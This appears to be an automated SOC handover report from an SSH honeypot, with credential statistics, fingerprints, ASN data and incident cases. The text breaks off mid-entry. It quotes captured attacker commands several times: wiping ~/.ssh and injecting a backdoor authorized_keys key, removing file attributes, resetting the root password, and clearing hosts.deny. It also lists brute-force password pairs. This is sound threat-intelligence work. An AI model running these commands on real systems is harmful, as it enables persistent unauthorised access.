# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T22:32:47Z |
| **Shift Time** | 22:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **223** |
| Confirmed Threats | **222** |
| False Positives Filtered | **1** (0.4%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **13** |
| High Severity Cases | **95** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **128** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **208** |
| Unique Credential Pairs | **63** |
| Unique Usernames | **32** |
| Unique Passwords | **60** |
| Successful Auth Pairs | **57** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 95 |
| `345gs5662d34` | 46 |
| `test` | 6 |
| `ubuntu` | 4 |
| `postgres` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 47 |
| `345gs5662d34` | 46 |
| `123456` | 6 |
| `123` | 4 |
| `ZAQ!2wsx2019` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 47 |
| `345gs5662d34` | `345gs5662d34` | 46 |
| `root` | `ZAQ!2wsx2019` | 3 |
| `odoo` | `Odoo10` | 2 |
| `ubuntu` | `Secret2026!` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `r00t` | `13.81.183.28` | 2026-04-12T20:44:31 |
| `root` | `3245gs5662d34` | `13.81.183.28` | 2026-04-12T20:44:35 |
| `root` | `Asd#123` | `13.81.183.28` | 2026-04-12T20:45:08 |
| `root` | `Root1234@@` | `13.81.183.28` | 2026-04-12T20:46:26 |
| `root` | `1234.QWER` | `13.81.183.28` | 2026-04-12T20:49:17 |
| `root` | `Pa55word` | `13.81.183.28` | 2026-04-12T20:50:44 |
| `root` | `QWEasdZXC` | `13.81.183.28` | 2026-04-12T20:51:25 |
| `root` | `aaXX111` | `187.174.238.116` | 2026-04-12T20:51:35 |
| `root` | `3245gs5662d34` | `187.174.238.116` | 2026-04-12T20:51:42 |
| `root` | `Qazwsx666..` | `13.81.183.28` | 2026-04-12T20:52:08 |
| `root` | `Qazwsx01!!` | `13.81.183.28` | 2026-04-12T20:52:53 |
| `root` | `Root1234@@` | `187.174.238.116` | 2026-04-12T20:53:07 |
| `root` | `123abc321` | `13.81.183.28` | 2026-04-12T20:53:37 |
| `root` | `a123456r` | `13.81.183.28` | 2026-04-12T20:55:07 |
| `root` | `asd1234` | `13.81.183.28` | 2026-04-12T20:55:50 |
| `root` | `QWEasdZXC` | `187.174.238.116` | 2026-04-12T20:56:12 |
| `root` | `12345ASDF` | `13.81.183.28` | 2026-04-12T20:57:55 |
| `root` | `Nd123456` | `13.81.183.28` | 2026-04-12T20:58:36 |
| `root` | `1234.QWER` | `187.174.238.116` | 2026-04-12T20:59:13 |
| `root` | `aaXX111` | `13.81.183.28` | 2026-04-12T21:00:01 |
| `root` | `r00t` | `187.174.238.116` | 2026-04-12T21:00:53 |
| `root` | `a123456r` | `187.174.238.116` | 2026-04-12T21:02:34 |
| `root` | `Pa55word` | `187.174.238.116` | 2026-04-12T21:04:11 |
| `root` | `Qazwsx01!!` | `187.174.238.116` | 2026-04-12T21:05:49 |
| `root` | `asd1234` | `187.174.238.116` | 2026-04-12T21:07:28 |
| `root` | `Qazwsx666..` | `187.174.238.116` | 2026-04-12T21:13:37 |
| `root` | `Asd#123` | `187.174.238.116` | 2026-04-12T21:18:19 |
| `root` | `123abc321` | `187.174.238.116` | 2026-04-12T21:19:59 |
| `root` | `12345ASDF` | `187.174.238.116` | 2026-04-12T21:21:38 |
| `root` | `Nd123456` | `187.174.238.116` | 2026-04-12T21:23:11 |
| `root` | `123456Ti` | `163.7.3.26` | 2026-04-12T21:31:49 |
| `root` | `3245gs5662d34` | `163.7.3.26` | 2026-04-12T21:31:53 |
| `root` | `Aa123456*` | `120.48.42.17` | 2026-04-12T21:39:42 |
| `root` | `ZAQ!2wsx2019` | `180.76.105.16` | 2026-04-12T21:41:59 |
| `root` | `3245gs5662d34` | `180.76.105.16` | 2026-04-12T21:42:12 |
| `root` | `ZAQ!2wsx2019` | `152.32.186.46` | 2026-04-12T21:46:06 |
| `root` | `3245gs5662d34` | `152.32.186.46` | 2026-04-12T21:46:09 |
| `root` | `Admin12345678$` | `152.32.186.46` | 2026-04-12T21:50:47 |
| `root` | `Asdfghjkl123456` | `152.32.186.46` | 2026-04-12T21:52:23 |
| `root` | `Asd123!@#` | `152.32.186.46` | 2026-04-12T21:53:59 |
| `root` | `Asdfghjkl123456` | `102.210.149.130` | 2026-04-12T21:55:16 |
| `root` | `3245gs5662d34` | `102.210.149.130` | 2026-04-12T21:55:20 |
| `root` | `Welcome@888!` | `102.210.149.130` | 2026-04-12T21:57:11 |
| `root` | `6969` | `152.32.186.46` | 2026-04-12T22:00:41 |
| `root` | `Qwertyuiop@@` | `102.210.149.130` | 2026-04-12T22:00:53 |
| `root` | `Asd123!@#` | `102.210.149.130` | 2026-04-12T22:02:44 |
| `root` | `ZAQ!2wsx2019` | `102.210.149.130` | 2026-04-12T22:06:26 |
| `root` | `Admin12345678$` | `102.210.149.130` | 2026-04-12T22:09:58 |
| `root` | `6969` | `102.210.149.130` | 2026-04-12T22:15:30 |
| `root` | `Welcome@888!` | `152.32.186.46` | 2026-04-12T22:15:49 |
| `root` | `Qwertyuiop@@` | `152.32.186.46` | 2026-04-12T22:17:29 |
| `root` | `admin1234@@` | `139.99.133.77` | 2026-04-12T22:28:23 |
| `root` | `3245gs5662d34` | `139.99.133.77` | 2026-04-12T22:28:27 |
| `root` | `root3` | `39.115.183.206` | 2026-04-12T22:29:04 |
| `root` | `3245gs5662d34` | `39.115.183.206` | 2026-04-12T22:29:07 |
| `root` | `root000!` | `14.103.112.110` | 2026-04-12T22:31:29 |
| `root` | `3245gs5662d34` | `14.103.112.110` | 2026-04-12T22:31:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **223** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 212 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 210 | 19 |
| `04f9d9fca3a9...` | Modern SSH client | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 210 | 19 | Modern SSH client |
| `04f9d9fca3a9...` | libssh | 1 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 47 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:cCJ18p95NPGe"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.42.17`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `180.76.105.16`, `163.7.3.26`, `13.81.183.28`, `187.174.238.116`, `102.210.149.130`, `14.103.112.110`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **17** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS16276` | OVH SAS | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (95)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b6f0bb1298c1

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:44 |
| **Last Seen** | 2026-04-12 20:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:44:30` | `cowrie.session.connect` |
| `2026-04-12 20:44:30` | `cowrie.client.version` |
| `2026-04-12 20:44:30` | `cowrie.client.kex` |
| `2026-04-12 20:44:31` | `cowrie.login.success` |
| `2026-04-12 20:44:31` | `cowrie.session.params` |
| `2026-04-12 20:44:31` | `cowrie.command.input` |
| `2026-04-12 20:44:31` | `cowrie.command.failed` |
| `2026-04-12 20:44:31` | `cowrie.log.closed` |
| `2026-04-12 20:44:32` | `cowrie.session.params` |
| `2026-04-12 20:44:32` | `cowrie.command.input` |
| `2026-04-12 20:44:32` | `cowrie.session.file_download` |
| `2026-04-12 20:44:32` | `cowrie.log.closed` |
| `2026-04-12 20:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7270d5a7f3a

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:44 |
| **Last Seen** | 2026-04-12 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:44:34` | `cowrie.session.connect` |
| `2026-04-12 20:44:34` | `cowrie.client.version` |
| `2026-04-12 20:44:34` | `cowrie.client.kex` |
| `2026-04-12 20:44:35` | `cowrie.login.success` |
| `2026-04-12 20:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2369ba6ebbf

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:45 |
| **Last Seen** | 2026-04-12 20:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:45:07` | `cowrie.session.connect` |
| `2026-04-12 20:45:07` | `cowrie.client.version` |
| `2026-04-12 20:45:07` | `cowrie.client.kex` |
| `2026-04-12 20:45:08` | `cowrie.login.success` |
| `2026-04-12 20:45:08` | `cowrie.session.params` |
| `2026-04-12 20:45:08` | `cowrie.command.input` |
| `2026-04-12 20:45:08` | `cowrie.command.failed` |
| `2026-04-12 20:45:08` | `cowrie.log.closed` |
| `2026-04-12 20:45:09` | `cowrie.session.params` |
| `2026-04-12 20:45:09` | `cowrie.command.input` |
| `2026-04-12 20:45:09` | `cowrie.session.file_download` |
| `2026-04-12 20:45:09` | `cowrie.log.closed` |
| `2026-04-12 20:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1c15a2a592

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:45 |
| **Last Seen** | 2026-04-12 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:45:11` | `cowrie.session.connect` |
| `2026-04-12 20:45:11` | `cowrie.client.version` |
| `2026-04-12 20:45:11` | `cowrie.client.kex` |
| `2026-04-12 20:45:12` | `cowrie.login.success` |
| `2026-04-12 20:45:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3835bcbf210a

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:46 |
| **Last Seen** | 2026-04-12 20:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:46:25` | `cowrie.session.connect` |
| `2026-04-12 20:46:25` | `cowrie.client.version` |
| `2026-04-12 20:46:25` | `cowrie.client.kex` |
| `2026-04-12 20:46:26` | `cowrie.login.success` |
| `2026-04-12 20:46:26` | `cowrie.session.params` |
| `2026-04-12 20:46:26` | `cowrie.command.input` |
| `2026-04-12 20:46:26` | `cowrie.command.failed` |
| `2026-04-12 20:46:26` | `cowrie.log.closed` |
| `2026-04-12 20:46:27` | `cowrie.session.params` |
| `2026-04-12 20:46:27` | `cowrie.command.input` |
| `2026-04-12 20:46:27` | `cowrie.session.file_download` |
| `2026-04-12 20:46:27` | `cowrie.log.closed` |
| `2026-04-12 20:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ecd76644a6b

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:46 |
| **Last Seen** | 2026-04-12 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:46:29` | `cowrie.session.connect` |
| `2026-04-12 20:46:29` | `cowrie.client.version` |
| `2026-04-12 20:46:29` | `cowrie.client.kex` |
| `2026-04-12 20:46:30` | `cowrie.login.success` |
| `2026-04-12 20:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1548157427d1

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:49 |
| **Last Seen** | 2026-04-12 20:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:49:16` | `cowrie.session.connect` |
| `2026-04-12 20:49:16` | `cowrie.client.version` |
| `2026-04-12 20:49:16` | `cowrie.client.kex` |
| `2026-04-12 20:49:17` | `cowrie.login.success` |
| `2026-04-12 20:49:17` | `cowrie.session.params` |
| `2026-04-12 20:49:17` | `cowrie.command.input` |
| `2026-04-12 20:49:17` | `cowrie.command.failed` |
| `2026-04-12 20:49:17` | `cowrie.log.closed` |
| `2026-04-12 20:49:18` | `cowrie.session.params` |
| `2026-04-12 20:49:18` | `cowrie.command.input` |
| `2026-04-12 20:49:18` | `cowrie.session.file_download` |
| `2026-04-12 20:49:18` | `cowrie.log.closed` |
| `2026-04-12 20:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f6edd9f8bb

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:49 |
| **Last Seen** | 2026-04-12 20:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:49:20` | `cowrie.session.connect` |
| `2026-04-12 20:49:20` | `cowrie.client.version` |
| `2026-04-12 20:49:20` | `cowrie.client.kex` |
| `2026-04-12 20:49:21` | `cowrie.login.success` |
| `2026-04-12 20:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d952148154c

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:50 |
| **Last Seen** | 2026-04-12 20:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:50:43` | `cowrie.session.connect` |
| `2026-04-12 20:50:43` | `cowrie.client.version` |
| `2026-04-12 20:50:43` | `cowrie.client.kex` |
| `2026-04-12 20:50:44` | `cowrie.login.success` |
| `2026-04-12 20:50:44` | `cowrie.session.params` |
| `2026-04-12 20:50:44` | `cowrie.command.input` |
| `2026-04-12 20:50:44` | `cowrie.command.failed` |
| `2026-04-12 20:50:44` | `cowrie.log.closed` |
| `2026-04-12 20:50:45` | `cowrie.session.params` |
| `2026-04-12 20:50:45` | `cowrie.command.input` |
| `2026-04-12 20:50:45` | `cowrie.session.file_download` |
| `2026-04-12 20:50:45` | `cowrie.log.closed` |
| `2026-04-12 20:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618bdc896a42

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:50 |
| **Last Seen** | 2026-04-12 20:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:50:47` | `cowrie.session.connect` |
| `2026-04-12 20:50:47` | `cowrie.client.version` |
| `2026-04-12 20:50:47` | `cowrie.client.kex` |
| `2026-04-12 20:50:48` | `cowrie.login.success` |
| `2026-04-12 20:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2933c6080411

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-12 20:51 |
| **Last Seen** | 2026-04-12 20:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
